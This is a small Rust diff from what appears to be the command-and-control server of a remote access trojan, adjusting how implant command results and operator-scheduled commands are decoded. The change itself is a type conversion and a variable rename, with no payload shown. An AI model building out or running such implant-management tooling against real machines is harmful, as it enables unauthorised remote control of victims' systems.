@@ -69,7 +69,7 @@ impl RecordCommandResult for MyRecordCommandResult {
         let request = request.into_inner();
         let implant_id = request.implant_id;
         let timestamp = request.timestamp;
-        let command: &str = RsRatCommand::from(request.command).into();
+        let command: &str = RsRatCommand::from(RatCommand::from_i32(request.command).unwrap()).into();
         let arguments = request.arguments;
         let result = request.result;
         // Determine where the result should be written based on the implant ID
@@ -103,7 +103,7 @@ impl ScheduleCommand for MyScheduleCommand {
         // Get the request from the operator and figure out what to do with it
         let command = OperatorCommand::from_i32(request.into_inner().command).unwrap();
         // Run the applicable command
-        let command_result = match command {
+        let _command_result = match command {
             OperatorCommand::OpCadence => {
                 // Passthrough
             },
